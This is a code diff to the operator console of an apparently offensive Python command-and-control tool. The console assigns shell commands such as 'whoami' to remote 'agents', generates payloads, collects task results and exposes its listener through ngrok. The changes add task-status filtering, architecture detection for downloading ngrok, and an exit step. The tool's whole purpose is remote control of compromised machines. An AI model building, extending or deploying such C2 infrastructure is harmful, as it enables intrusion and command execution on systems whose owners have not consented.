@@ -9,9 +9,16 @@ from getpass import getpass
 from uuid import uuid4
 from subprocess import Popen, PIPE
 import time, _thread, os
-import code#, pdb
+import code, platform
+
+arm = "arm aarch64_be aarch64 armv8b armv8l".split(" ")
+x86 = "i386 i686".split(" ")
+x64 = ["x86_64"]
 
 author = config.info()
+mch = platform.machine()
+
+
 
 class var(object):
         current_agent = None
@@ -28,12 +35,12 @@ man = {
         '!':'Runs a command locally. Usage: \'! ls | grep rtc2\'',
         'cmd':'Assign a command to selected agent. Usage: \'cmd "whoami"\'',
         'startServer':'Starts the listener',
-        'tasklist':'Show all tasks',
+        'tasklist':'Show all tasks. Usage: \'tasklist [all/waiting/in-progress/done\'',
         'getResult':'Show result for specific task. Usage: \'getResult 102\'',
         'genPayload':'Generates a payload. Usage: \'genPayload python3\' (options: python3,)',
         'taskkill':'Removes a task from the tasklist. Usage: \'taskkill 301\' (replace \'301\' with task id)',
         'ngrokUrl':'Gets the current ngrok url',
-        'python':'Enter an interactive python debugging shell',
+        'python':'Enter an interactive python debugging shell (use CTRL-D to exit)',
         }
 
 def help_menu():
@@ -110,7 +117,7 @@ class Handler(object):
                                 return None
                         com = cmd.split('"')[1]
                         uid = str(uuid4())
-                        server.commands.append({'agent':var.current_agent,'id':uid,'cmd':com,'time':time.time()})
+                        server.commands.append({'agent':var.current_agent,'id':uid,'cmd':com,'time':time.time(),"status":"waiting"})
                         print(ok("Command added to tasklist"))
                         return None
                 elif base == "startServer":
@@ -119,10 +126,20 @@ class Handler(object):
                         _thread.start_new_thread(do_ngrok, ( ))
                         return None
                 elif base == "tasklist":
+                        try:
+                                sort = cmd.split(" ")[1]
+                                if not sort in ['all','waiting','in-progress','completed']:
+                                        print(error("Invalid filter. Valid filters: all, waiting, in-progress, completed"))
+                                        print(info("Sorting by all"))
+                                        sort = "all"
+                        except:
+                                print(info("Auto-sorting by all"))
+                                sort = "all"
                         tsk = server.commands
                         print("Tasks:")
                         for i in tsk:
-                                print("Agent: %s, cmd: %s, id: %s" % (c(i['agent'],"cyan"),c(i['cmd'],"cyan"),c(i['id'],"cyan")))
+                                if i['status'] == sort or sort == "all":
+                                        print("Agent: %s, cmd: %s, id: %s, time: %s" % (c(i['agent'],"cyan"),c(i['cmd'],"cyan"),c(i['id'],"cyan"),c(i['time'],"cyan")))
                         return None
                 elif base == "getResult":
                         try:
@@ -171,7 +188,6 @@ class Handler(object):
                         print("Ngrok url: [%s]" % c(ngrok.get_url(),"green"))
                         return None
                 elif base == "python":
-                        #pdb.set_trace()
                         try:
                                 code.interact(local=dict(globals(), **locals()))
                         except SystemExit:
@@ -205,7 +221,14 @@ def start_sequence():
                 for i in parts:
                         nfiles.append(i)
         if not 'ngrok' in nfiles: # cuz ngrok.py
-                ver = config.cfg().ver
+                if mch in arm:
+                        ver = "arm"
+                elif mch in x86:
+                        ver = "32"
+                elif mch in x64:
+                        ver = "64"
+                else:
+                        ver = config.cfg().ver
                 if ver == "64":
                         ngrok.download_64bit()
                 elif ver == "32":
@@ -223,6 +246,7 @@ def exit_sequence():
 def main():
         start_sequence()
         start_shell(Handler())
+        exit_sequence()
 
 if __name__ == "__main__":
         main()
